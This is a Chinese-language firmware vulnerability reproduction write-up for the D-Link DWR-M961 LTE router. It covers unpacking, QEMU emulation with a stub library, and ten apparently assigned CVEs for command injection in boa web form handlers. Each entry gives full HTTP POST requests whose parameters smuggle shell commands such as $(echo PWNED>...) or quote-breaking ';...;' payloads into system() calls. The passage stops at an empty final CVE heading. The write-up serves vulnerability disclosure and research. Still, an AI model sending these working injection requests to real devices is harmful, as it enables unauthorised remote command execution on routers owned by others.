# D-Link DWR-M961 漏洞复现
> 刘为民
> 来源：https://www.iotsec-zone.com/article/557

## 提取文件系统

#### 下载固件

[http://downloads.d-link.co.za/DWR/dwrm961/firmware/C1/DWR-M961_1.1.2_C1_202602110044.bin](http://downloads.d-link.co.za/DWR/dwrm961/firmware/C1/DWR-M961_1.1.2_C1_202602110044.bin)

#### binwalk解包

```
binwalk -Me binwalk -Me DWR-M961_1.1.2_C1_202602110044.bin
```

![0.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr7kjzffn1yzwa2fi.png)

## 启动项分析

**架构**: 32位MIPS

![1.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzofy7ao2jkjvnsc.png)
		**检查保护** 		

![2.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzoubo8833otfdbh.png)
**开机到入口**：设备上电后 U-Boot 加载 Linux 内核，内核跑起的第一个进程 /sbin/init。init 读/etc/inittab，其中 sysinit 项指向 /etc/init.d/rcS，这就是整个启动的入口。控制台登录由 inittab 里的 /bin/login负责，密码从 /var/shadow 验证，这个文件是 rcS 启动时从 /etc/shadow.sample 复制来的。

**rcS 总控**：rcS 是总脚本，分rcS、rcS_GW、rcS_GW_yilian三个。主要完成系统初始化挂载文件系统（proc、ramfs、yaffs2配置分区），创建/var下所有运行时目录（包括临时文件、日志、Web、DHCP、VPN、SMB、TR-069、UPnP、SNMP等）；再把shadow、passwd、group、cwmp 等配置复制到 /var；然后做启动前校验并拉起外围服务，包括 CINIT=1 时执行 startup.sh 校验flash 配置、后台启动看门狗、加载无线模块；最后进入主初始化，调用 init.sh gw all 去启动 sysconf 主守护，配置好 br0 桥和IP，再前台启动 boa Web 服务器，执行 post_startup.sh。

配置校验：startup.sh 用 /bin/flash 工具对 flash上的硬件、蓝牙、客户、默认、当前五类配置做签名和校验和检查，非法就从备份或默认恢复。由于管理员密码也存flash，校验失败会恢复默认 admin/admin。

sysconf 主守护： 配置文件/bin/sysconf。它按 MIB 配置拉起各服务，包括boa、dnsmasq、udhcpc/udhcpd、ntp_inet、firewall.sh、snmpd.sh、syslogd、无线和 WAN 相关，同时负责 MIB读写和标志文件触发事件。

**boa Web 服务**：/bin/boa root 运行，配置在 /etc/boa/boa.conf，监听 80 端口，处理 /boafrm/表单、/quicksetup.cgi 和 /app/app.cgi，rcS 直接 boa；rcS_GW用 webs&。

## 固件模拟

#### 环境依赖

先检查boa文件

```sh
ROOT=~/Desktop/squashfs-root
ls -l "$ROOT/bin/boa"
file "$ROOT/bin/boa"
readelf -h "$ROOT/bin/boa" | grep -iE "machine|class|data"
readelf -d "$ROOT/bin/boa" | grep NEEDED
```

![3.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr7kwpzvzdusw4v2e.png)

MIPS32位小端

复制qemu-mipsel-static、mipsel-linux-gnu-gcc、gdb-multiarch、binfmt_misc(qemu-mipsel 已注册)到当前目录

![4.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr7la54y4fvdhy9fs.png)

**确认 binfmt_misc 注册**（boa 派生 CGI / 子进程时会 fork 出其他 MIPS 二进制，必须能被内核直接交给 qemu 执行）

#### 尝试拉起服务

这里boa要用root权限起

```
sudo chroot "$ROOT" /bin/sh -c "
echo 'root:x:0:0:root:/root:/bin/sh' >> /etc/passwd
echo 'root::0:0:root:/root:/bin/sh' >> /etc/passwd
"
```

```
ROOT=$PWD 
sudo cp /usr/bin/qemu-mipsel-static "$ROOT/usr/bin/"
sudo chroot "$ROOT" /usr/bin/qemu-mipsel-static /bin/boa
```

![5.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr7lpp468jmjhko0j.png)

boa启动第一件事就是 `apmib_init()` 从 `/dev/mtdblock0` 读 hw setting / DS / CS 配置区,校验 "H6" 签名、版本、校验和,chroot 用户态没有 flash 所以失败

所以应该用hook去顶替libapmib，让函数运行成功

#### 编写 hook 桩库

```c
typedef unsigned int u32;
int pMib;                     
int pMibDef;                   
int pHwSetting;                
int pCustomerHwSetting;        
int wlan_idx;                  
int vwlan_idx;                 
int wlan_idx_bak;              
int vwlan_idx_bak;             
int compress_hw_setting;       
char mib_root_table[136];      
char hwmib_root_table[136];    
char customer_hwmib_root_table[136]; 

int apmib_init(void)  { return 1; }
int apmib_reinit(void) { return 1; }
int apmib_get(int id, void *value)
{
    if (value) {
        volatile unsigned char *p = (volatile unsigned char *)value;
        p[0] = 0; p[1] = 0; p[2] = 0; p[3] = 0;
    }
    (void)id;  // 防止编译器警告：参数 id 未使用
    return 1;
}

int apmib_get_wlan(int id, void *value)
{
    return apmib_get(id, value);
}

int apmib_set(int id, void *value)
{
    (void)id; (void)value;
    return 1;
}

int apmib_update(int type) { (void)type; return 1; }
int apmib_updateFlash(int type) { (void)type; return 1; }

int apmib_sem_lock(void)   { return 1; }
int apmib_sem_unlock(void) { return 1; }

int flash_read_raw_mib(void *p)  { (void)p; return 1; }
int flash_write_raw_mib(void *p) { (void)p; return 1; }

int mib_search_by_id(int a1, int a2, void *a3, void *a4, void *a5)
{
    (void)a1; (void)a2; (void)a3; (void)a4; (void)a5;
    return 0;
}

int getWANMibIdByName(char *name) { (void)name; return 0; }

int getVPNMibIdByName(char *name) { (void)name; return 0; }

int swapWLANIdxForCwmp(int idx)   { return idx; }

int save_cs_to_file(void) { return 1; }  // 保存当前设置到文件
int set_timeZone(void)    { return 0; }  // 设置时区：返回 0（失败）

int update_tblentry(void *a, int b, void *c)
{
    (void)a; (void)b; (void)c;
    return 1;
}
```

![6.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkr7ms2ecrznz4qf8e.png)

**编译**（必须在 squashfs-root 的 `lib/` 目录存在的前提下）：

```sh
 mipsel-linux-gnu-gcc -shared -fPIC -nostdlib \
      -o "$R/lib/libapmib.so" "$R/_analysis/apmib_shim.c"
```

- `-shared -fPIC`：编成动态库
- `-nostdlib`：不依赖 libc，保证能安全 preload 进 uClibc 进程
- 直接编成libapmib.so方便替换

#### 布置chroot

```sh
cp /usr/bin/qemu-mipsel-static "$ROOT/usr/bin/"
sudo mount -t proc proc "$ROOT/proc"
mountpoint -q "$ROOT/proc" && echo "proc 已挂载"
```

#### 启动boa

```sh
ashfs-root$
sudo chroot "$ROOT" /usr/bin/qemu-mipsel-static \
    -E LD_PRELOAD=/lib/apmib_shim.so /bin/boa -d
```

**成功标志**（看到这五行就是通了）：

```
Enabling OpenSSL security system
Loaded SSL certificate file: /etc/certificate.crt
Opened private key file: /etc/privateKey.key
boa: server version Boa/0.94.14rc21
boa: starting server pid=XXXX, port 80
```

![7.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzphxzsfgu49igoa.png)

#### 一键启动脚本

```sh
cat > "$ROOT/_analysis/run_boa.sh" <<'EOF'
#!/bin/bash
# 用法: sudo ./_analysis/run_boa.sh [-g|-s|-h]
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SHIM_SRC="$ROOT/_analysis/apmib_shim.c"
SHIM_SO="$ROOT/lib/apmib_shim.so"

# 1. 编译桩库(源码比产物新才重编)
if [ ! -f "$SHIM_SO" ] || [ "$SHIM_SRC" -nt "$SHIM_SO" ]; then
    echo "[*] 编译 apmib_shim.so"
    mipsel-linux-gnu-gcc -shared -fPIC -nostdlib -o "$SHIM_SO" "$SHIM_SRC" || exit 1
fi

# 2. qemu 用户态二进制放进 chroot
[ -x "$ROOT/usr/bin/qemu-mipsel-static" ] || cp /usr/bin/qemu-mipsel-static "$ROOT/usr/bin/"

# 3. 挂载 /proc
if ! mountpoint -q "$ROOT/proc"; then
    echo "[*] mount -t proc proc $ROOT/proc"
    mount -t proc proc "$ROOT/proc" || exit 1
fi

MODE="${1:-}"
case "$MODE" in
    -g) echo "[*] boa 启动中 (gdbstub :1234, -d 前台模式)..."
        exec chroot "$ROOT" /usr/bin/qemu-mipsel-static -g 1234 \
             -E LD_PRELOAD=/lib/apmib_shim.so /bin/boa -d ;;
    -s) echo "[*] boa 启动中 (strace -> /boa_strace.log)..."
        rm -f "$ROOT/boa_strace.log"
        exec chroot "$ROOT" /usr/bin/qemu-mipsel-static -strace -D /boa_strace.log \
             -E LD_PRELOAD=/lib/apmib_shim.so /bin/boa -d ;;
    *)  echo "[*] boa 启动中 (前台, -d 模式)..."
        exec chroot "$ROOT" /usr/bin/qemu-mipsel-static \
             -E LD_PRELOAD=/lib/apmib_shim.so /bin/boa -d ;;
esac
EOF
chmod +x "$ROOT/_analysis/run_boa.sh"
sudo "$ROOT/_analysis/run_boa.sh"     # 一键启动
```

![8.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzpo17bqy7h9grmc.png)

# CVE-2026-71944

`formLtefotaUpgradeQuectel` 组件 `fota_url` 参数命令注入

## 漏洞描述

`/boafrm/formLtefotaUpgradeQuectel` 处理器在 Quectel FOTA 升级功能中,对 `fota_url` 参数仅做"长度 <0x191 + `strstr` 含 `http://`/`https://`/`ftp://` 子串"两个弱检查,随后 `sprintf` 拼入 `system()`，可注入任意命令。

## 漏洞详情

**受影响组件**: `/boafrm/formLtefotaUpgradeQuectel`

**受影响函数**: `sub_4163E0`

**数据流向**:

	获取输入sub_4102DC(a1, "fota_url", &dword_4A498C)(URL 解码,无字符过滤)
	
	调用过滤strlen(v3) < 0x191且 strstr(v3,"http://") || "https://" || "ftp://"
	
	危险拼接`sprintf(v7, "/var/upgrade_quectel %s&", v3)`
	
	命令执行`system(v7)` 

![9.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzpy6olzyizt3par.png)

## 请求包

![10.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzq4ea72ej0h0x4e.png)

```bash
POST /boafrm/formLtefotaUpgradeQuectel HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=fV4RRVUfxci/gsb08qQXpsis

Connection: close

Content-Length: 69

fota_url=http://a;echo PWNED44>/var/tmp/pwn44&submit-url=/cpefota.htm
```

![11.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzqbgwoyzkjqqr3k.png)

# CVE-2026-71945

`formLtefotaUpgradeFibocom` 组件 `fota_url` 参数命令注入

## 漏洞描述

`/boafrm/formLtefotaUpgradeFibocom` 处理器与 CVE-2026-71944 同型,但存在模板 `at-cmd 'AT+GTSET="CALLBREAK",1'; upgrade_fibocom %s&` 而且自带分号。

## 漏洞详情

**受影响组件**: `/boafrm/formLtefotaUpgradeFibocom`

**受影响函数**: `sub_4166C8` 

**数据流向**: 

	获取输入fota_url
	
	检查(strlen<0x191)
	
	拼接sprintf(v7, "at-cmd 'AT+GTSET=\"CALLBREAK\",1'; upgrade_fibocom %s&", v4)
	
	命令执行system

![12.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzqk7ef2hnnx0afv.png)

## 请求包

![13.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzqnls7o0jsv0weh.png)

```bash
POST /boafrm/formLtefotaUpgradeFibocom HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=fV4RRVUfxci/gsb08qQXpsis

Connection: close

Content-Length: 69

fota_url=http://a;echo PWNED45>/var/tmp/pwn45&submit-url=/cpefota.htm
```

![14.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzqynby3i9nl1huu.png)

# CVE-2026-71946

formPingDiagnosticRun组件host参数命令注入

## 漏洞描述

`/boafrm/formPingDiagnosticRun` 的 ping 诊断功能,`host` 参数仅限长 ≤32,sprintf("ping%s %s -w 5 &> /var/tmp/pingDiagnosticResult")命令执行`system()`,无过滤。

## 漏洞详情

**受影响组件**: `/boafrm/formPingDiagnosticRun`

**受影响函数**: `sub_420204`

**数据流向**: 

	获取输入`host`和`ipVer`
	
	过滤(host strlen<0x21 / ipver strlen<0x11)
	
	拼接 `sprintf(v15, "ping%s %s -w 5 &> /var/tmp/pingDiagnosticResult", v14)` 
	
	命令执行`system`

![15.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzr6xmh3zppmvg3a.png)

命令执行v15，由dword_4A498C传入sprintf拼接

![16.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzrxuecptuotcqmz.png)

也就是host表单数据

再看检查

![17.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzs12ry5iw8vgvdl.png)

## 请求包

![18.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzs9alvljmyc8hms.png)

```bash
POST /boafrm/formPingDiagnosticRun HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=3WbdymjoXybF6hCnnTW2rlET

Connection: close

Content-Length: 62

host=$(echo PWNED>/var/tmp/pwn46)&ipVer=4&submit-url=/ping.htm
```

![19.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzshkwvcenic3g7n.png)

# CVE-2026-71947

formTracerouteDiagnosticRun 组件 host/ipVer 命令注入

## 漏洞描述

/boafrm/formTracerouteDiagnosticRun 的 traceroute 诊断,host(≤32)与 ipVer(≤16)原样拼入sprintf(v13, "traceroute -%s %s -w 2 &> /var/tmp/tracerouteDiagnosticResult", v7)，无过滤。

## 漏洞详情

**受影响组件**: `/boafrm/formTracerouteDiagnosticRun`

**受影响函数**:`sub_42051C`

**数据流向**: 

	获取输入`host`/`ipVer`
	
	过滤strlen
	
	拼接 `sprintf(v13, "traceroute -%s %s -w 2 &> /var/tmp/tracerouteDiagnosticResult", ipVer, host)`
	
	命令执行`system`

![20.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzsx7l2ra6atjypo.png)

命令执行v13，由v7传入sprintf拼接

![21.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzt1apjensmg12ws.png)

也就是ipver表单数据

再看检查

![22.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzt4nv6u8zxtizs3.png)

ipver的检查，strlen<0x11，host检查strlen<0x21

## 请求包

![23.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzt8sxudpdywxhro.png)

```bash
POST /boafrm/formTracerouteDiagnosticRun HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=3WbdymjoXybF6hCnnTW2rlET

Connection: close

Content-Length: 68

host=$(echo PWNED>/var/tmp/pwn47)&ipVer=4&submit-url=/traceroute.htm
```

![24.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqztd9vip3ejdbc6g.png)

# CVE-2026-71948

formDebugDiagnosticRun 组件 host 参数命令注入

## 漏洞描述

`/boafrm/formDebugDiagnosticRun` 的调试诊断功能。黑名单仅不以 `top`/`ping` 开头、不等于 `flash all`,直接绕过。

## 漏洞详情

**受影响组件**: `/boafrm/formDebugDiagnosticRun`(固件无对应 htm,隐藏 handler)

**受影响函数**: `sub_420828`

**数据流向**: 

	获取输入host(≤128)

![25.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqztj5c44l18qkdwf.png)

	过滤黑名单 top/ping/flash all

![26.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzto0ztk6dhzrpne.png)

	拼接sprintf(v9, "%s &> /var/tmp/debugDiagnosticResult", host)
	
	命令执行system（v9）

## 请求包

![27.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzts9ps6ykfonkzl.png)

```bash
POST /boafrm/formDebugDiagnosticRun HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=MkiXElY8PkWOmeq9DQ3VK3yU

Connection: close

Content-Length: 53

host=echo PWNED48>/var/tmp/pwn48&submit-url=/diag.htm
```

![28.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqztyibjktjsn1irq.png)

# CVE-2026-71949

formUSSDSetup 组件 ussdValue/selectMenuValue 命令注入

## 漏洞描述

`/boafrm/formUSSDSetup` 的 USSD 管理,`ussdValue`(ussd 模式)/`selectMenuValue`(menu 模式)拼入 `at-cmd -t %s 'AT+CUSD=1,"%s",15' -w`,值在单引号内,用 `'` 闭合后 `$()` 注入。

## 漏洞详情

**受影响组件**: `/boafrm/formUSSDSetup`

**受影响函数**: sub_41F14C、sub_41EFCC(前提是/var/test_ussd不存在)

**数据流向**: 

	sub_41F14C获取输入`ussdValue`/`selectMenuValue`

![29.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzu6q9ulfkjq0wjc.png)

​	

	sub_41F14C拼接 `at-cmd -t %s 'AT+CUSD=1,"%s",15' -w` 
	
		ussd 模式

![30.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzuc1z62fb5dnpyq.png)

		menu 模式（v11不等于1，也就是ussdCancelInput不等于1）

![31.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzugr469b6djd3dp.png)
	最后传入sub_41EFCC命令执行`system`(单引号闭合注入)

## 请求包

![32.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzukqu18kudqq1i3.png)

```bash
# ussd 模式
POST /boafrm/formUSSDSetup HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=YoJnKadM6XdCto2Zfm0B9ZtG

Connection: close

Content-Length: 82

ussdStatusInput=ussd&ussdValue=x';echo PWNED>/var/tmp/pwn49;'&submit-url=/ussd.htm
# menu 模式 (需 ussdCancelInput≠1)
# 传ussdStatusInput=menu&selectMenuValue=x';$(id>/var/tmp/pwn);'&submit-url=/ussd.htm，不成功
```

![33.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzuosinuophqwxtk.png)

# CVE-2026-71950

formSmsManage 组件 action_value 命令注入

## 漏洞描述

`/boafrm/formSmsManage` 的短信管理,`action_value` 在 delete/readMsg 分支直接拼入 `at-cmd AT+CMGD=%s`/`AT+CMGR=%s`,无过滤。

## 漏洞详情

**受影响组件**: `/boafrm/formSmsManage`

**受影响函数**: `sub_41E9F0` /`sub_41EB14` 

**数据流向**: 

	前提参数action_id=delete或者readMsg

![34.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzuu8n9ysbqydzqs.png)

	获取输入 `action_value`，两个执行函数一样都无过滤可直接拼接命令执行，拼接 `at-cmd AT+CMGD=%s` / `AT+CMGR=%s`

![35.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzuxeaf0jwkhhhv5.png)

## 请求包

![36.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzv0qjl8qwsabokx.png)

```bash
POST /boafrm/formSmsManage HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=MkiXElY8PkWOmeq9DQ3VK3yU

Connection: close

Content-Length: 79

action_id=delete&action_value=$(echo PWNED>/var/tmp/pwn50)&submit-url=/sms.htm
```

![37.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzv55opipp6747wi.png)

# CVE-2026-71951

formIMEISetup 组件 IMEI_value 命令注入

## 漏洞描述

`/boafrm/formIMEISetup` 的 IMEI 配置,`IMEI_value`(<0x21)拼入命令(无引号/单引号),无过滤。

## 漏洞详情

**受影响组件**: `/boafrm/formIMEISetup`

**受影响函数**: `sub_41F8FC` (handler) →  `sub_41F878` (popen/system)

**数据流向**:

	 获取输入 `IMEI_value`(<0x21)给到v2，进入判断，再给v3传入拼接

![38.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzvbabeyuu0zbpsz.png)

	`at-cmd AT+SIMEI=%s`(无引号)

![39.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzveipwrdwsrsa79.png)

	`at-cmd 'AT+GSN="%s"'`(单引号)

![40.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzvhvx30ecqb7j4v.png)

	`at-cmd 'AT*MRD_IMEI=W,0101,12NOV2010,%s'` （单引号）

![41.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzvmy3s5bbnctiol.png)

	全部都是通过v10传给`system`，以及后面的sub_41F878的popen

![42.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzvq5ur5e8kq9xdp.png)

![43.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzvt7vy3j3taq6c1.png)

## 请求包

![44.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzw0ms94wq64cwpe.png)

```bash
POST /boafrm/formIMEISetup HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=wHWBDnp7mfCB2fLNOxWst6zr

Connection: close

Content-Length: 60

IMEI_value=$(echo PWNED>/var/tmp/pwn51)&submit-url=/imei.htm
#单引号：IMEI_value=x';echo PWNED7b>/var/tmp/pwn7b;'&submit-url=/imei.htm
```

![45.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzw4wp3815rsxkmd.png)

# CVE-2026-71952

formPinManageSetup 组件 oldPIn 命令注入

## 漏洞描述

`/boafrm/formPinManageSetup` 的 SIM PIN 管理,`operationName=modifyPin` 时 `oldPIn`(<0x81)直接拼入 `at-cmd 'at+CPWD="SC","%s","%s"'`(新 PIN 会经 `sub_46E014` 变换)。

## 漏洞详情

**受影响组件**: `/boafrm/formPinManageSetup`

**受影响函数**: `sub_41E82C` (handler) → `sub_41E400` (sink worker)

**数据流向**: 

	获取输入oldPIn给v5，同时检查strlen(v5)是否>=0x81

![46.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwddg326rague0u.png)

	拼接 sprintf(v16, "at-cmd 'at+CPWD=\"SC\",\"%s\",\"%s\"' > /var/tmpAtRet", v5, v17)

![47.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwgredxxoeylgnh.png)

	命令执行system

## 请求包

![48.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwjyxxu93j6ulc4.png)

```bash
POST /boafrm/formPinManageSetup HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

sec-ch-ua-platform: "Linux"

Accept: */*

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: no-cors

Sec-Fetch-Dest: script

Referer: http://127.0.0.1/boafrm/formLoginSetup

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=MkiXElY8PkWOmeq9DQ3VK3yU

Connection: close

Content-Length: 93

operationName=modifyPin&oldPIn=x';echo PWNED>/var/tmp/pwn52;'&newPin=1234&submit-url=/pin.htm
```

![49.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwos3zozmm7oawe.png)

---

# CVE-2026-71954

formL2tpv3ConfigSetup 组件 tunnelid/sessionid 存储型命令注入

## 漏洞描述

`/boafrm/formL2tpv3ConfigSetup` 的 L2TPv3 配置,`tunnelid`/`peertunnelid`/`sessionid`/`peersessionid`(≤12)无过滤,`enableId=on` 时，由 `sysconf l2tpv3` 拼入 `l2tpv3tun del` 执行

## 漏洞详情

**受影响组件**: `/boafrm/formL2tpv3ConfigSetup`

**受影响函数**: `sub_416D08` → `sub_416808`;`bin/sysconf` `sub_424DD8`

**数据流向**:

	sub_416808获取输入 `tunnelid` (≤12)

![50.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwwr9tihyv3csrm.png)

	`enableId=on` 时

![51.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzwzv35eetgl4w6m.png)

	`apmib_set` 持久化

![52.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzx2wg9l0oegw4zs.png)

`apmib_get(27163、27165)` 读取到v23、v22

![53.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzx5r9guwo2j3cs9.png)

	获取submit-url

![54.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzx8zgg8khxi4qo7.png)

	拼接`l2tpv3tun del tunnel tunnel_id %s 2>/dev/null`，`system` (del 无条件执行)

![55.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxbvnbgymd9h8ku.png)

## 请求包

![56.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxh31aya5crmivl.png)

```bash
POST /boafrm/formL2tpv3ConfigSetup HTTP/1.1

Host: 127.0.0.1

Cookie: lang_sel=true; i18next=zh_CN; lstatus=true; token=D45FC714C57D27E30E3EFA1350ACF85D; webuicookie=Gx8P5I409DaGx8HtErw4AG0g

Content-Type: application/x-www-form-urlencoded

Content-Length: 224

Connection: close

enableId=on&tunnelid=$(id>/tmp/x)&peertunnelid=1&sessionid=1&peersessionid=1&remoteIPAddress=1.1.1.1&localupdport=1701&remoteudpport=1701&mtu=1400&LocalTunnelAddress=3.3.3.3&RemoteTunnelAddress=4.4.4.4&submit-url=/l2tpv3.htm
#这里要把获取的参数写全缺一不可
```

![57.png](https://www.iotsec-zone.com/api/image/v2/20260817/dkqzxlghjw7qltaebr.png)

# CVE-2026-71955

